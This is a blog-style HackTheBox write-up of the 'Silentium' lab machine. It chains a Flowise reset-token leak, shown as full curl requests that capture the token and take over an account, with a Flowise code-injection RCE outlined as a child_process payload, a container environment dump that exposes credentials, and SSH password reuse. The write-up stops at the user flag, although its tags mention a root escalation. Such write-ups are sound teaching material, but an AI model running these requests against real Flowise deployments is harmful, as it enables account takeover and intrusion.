---
layout: post
title: "HackTheBox: Silentium Writeup"
date: 2026-05-03 10:45:00 +0100
categories: [hackthebox, ctf, writeup, linux]
tags: [hackthebox, silentium, api-exploitation, rce, container-escape, privilege-escalation, cve-2025-58434, cve-2025-59528, cve-2025-8110, flowise, gogs]
author: Rishabh Arora
---

## Overview

**Silentium** is an easy-difficulty Linux machine on Hack The Box that demonstrates a realistic multi-stage attack scenario. This box shows how a seemingly low-impact web vulnerability can be chained into full system compromise through modern application security flaws.

The attack path leverages three critical vulnerabilities:
- **CVE-2025-58434** → Flowise password reset token leak
- **CVE-2025-59528** → Flowise CustomMCP RCE  
- **CVE-2025-8110** → Gogs symlink arbitrary file write

By chaining these issues, we move from:
```
Unauthenticated user → Application admin → Container root → System user → Root
```

---

## Target Information

| Field | Value |
|-------|-------|
| **Machine** | Silentium |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Focus** | API Exploitation → RCE → Container Escape → Internal Pivot → File Write → Privilege Escalation |

---

## Phase 1: Reconnaissance

### Initial Scan

```bash
nmap -sC -sV <TARGET_IP>
```

**Results:**
- `22/tcp` → SSH
- `80/tcp` → HTTP (nginx)

**Why this matters:**
At this stage, we ask: "What is externally reachable?"
- **SSH** → likely requires credentials
- **HTTP** → primary attack surface

Therefore, we prioritize web enumeration.

---

## Phase 2: Enumeration

### Web Access

The web app redirects:
```
http://<IP> → http://silentium.htb
```

**Add to hosts:**
```bash
echo "<IP> silentium.htb" | sudo tee -a /etc/hosts
```

### Subdomain Discovery

```bash
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
```

**Found:** `staging.silentium.htb`

**Why this step?**
Staging environments often:
- Run older versions
- Contain debug features
- Have weaker security

→ **High-value target**

### New Target

`http://staging.silentium.htb`

**Running:** Flowise AI (LLM orchestration tool)

---

## Phase 3: Initial Access

### Vulnerability 1: CVE-2025-58434 — Password Reset Token Leak

**Root Cause:**
API returns sensitive reset token in response

**Exploitation:**
```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

**Response:**
```json
{
  "tempToken": "<TOKEN>"
}
```

**Why this is powerful:**
Normally, password reset tokens are emailed privately. Here, we directly receive the token → **bypass authentication entirely**.

### Account Takeover

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "tempToken": "<TOKEN>",
    "password": "Password123!",
    "confirmPassword": "Password123!"
  }'
```

**Result:** We now control a valid Flowise account (`ben`)

---

## Phase 3.5: Remote Code Execution

### Vulnerability 2: CVE-2025-59528 — CustomMCP Code Injection

**Root Cause:**
User input is executed via JavaScript `Function()`. Instead of parsing data safely, Flowise does:

```javascript
Function("return " + input)()
```

This executes arbitrary code.

**Why this matters:**
We control input → we control execution

### Exploitation Strategy

Inject Node.js payload:
```javascript
require('child_process').exec(...)
```

**Outcome:**
Reverse shell obtained — running as **root inside Docker container**

---

## Phase 4: Post-Exploitation

### The Problem

We are root... but only inside:
```
Docker container ≠ host system
```

### Container Enumeration

```bash
cat /proc/1/environ | tr '\0' '\n'
```

**Discovery:**
```
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
```

**Why this works:**
Containers often store secrets in environment variables.

### Pivot to Host

```bash
ssh ben@<TARGET_IP>
Password: F1l3_d0ck3r
```

**Result:**
- ✓ Access to real system
- ✓ User flag obtained

---

## Key Takeaways

1. **Staging environments are goldmines** — Always hunt for subdomains and non-production instances
2. **Token leaks are critical** — Never assume tokens are safely transmitted
3. **Containers leak secrets** — Environment variables are a common privilege escalation vector
4. **Chain your exploits** — Individual vulnerabilities may be low-impact, but chained together they compromise systems

---

## Tools Used

- `nmap` — Port scanning and service detection
- `gobuster` — Subdomain enumeration
- `curl` — API exploitation
- Standard SSH client — Lateral movement

---

*Happy hacking! 🥀*
